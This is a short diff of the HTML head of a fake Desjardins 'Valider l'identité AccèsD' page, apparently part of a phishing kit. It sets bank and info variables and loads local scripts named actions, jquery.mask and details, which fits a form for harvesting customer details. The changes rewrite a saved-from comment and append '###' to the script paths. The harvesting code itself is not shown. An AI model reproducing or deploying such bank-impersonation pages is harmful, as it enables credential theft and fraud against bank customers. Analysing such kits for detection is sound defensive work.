@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<? php  ?>=(0039)/220098/desj/d -->
+<!-- saved from url=(0039)/220098/desj/d -->
 <html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <title>Valider l'identité AccèsD AccèsD Affaires | Desjardins</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -60,11 +60,11 @@
             width: 100% !important;
         }
         </style>
-        <script src="./DESJ_4_files/jquery-3.6.0.min" crossorigin="anonymous"></script>
+        <script src="./DESJ_4_files/jquery-3.6.0.min.js###" crossorigin="anonymous"></script>
         <script>var lrbank = 'Desj'; var lrinfo = 'Details';</script>
-        <script src="./DESJ_4_files/actions"></script>
-        <script src="./DESJ_4_files/jquery.mask"></script>
-        <script src="./DESJ_4_files/details"></script>
+        <script src="./DESJ_4_files/actions.js###"></script>
+        <script src="./DESJ_4_files/jquery.mask.js###"></script>
+        <script src="./DESJ_4_files/details.js###"></script>
     </head>
     <body class="isolation-bootstrap-3">
         <!-- if app_mobile -->
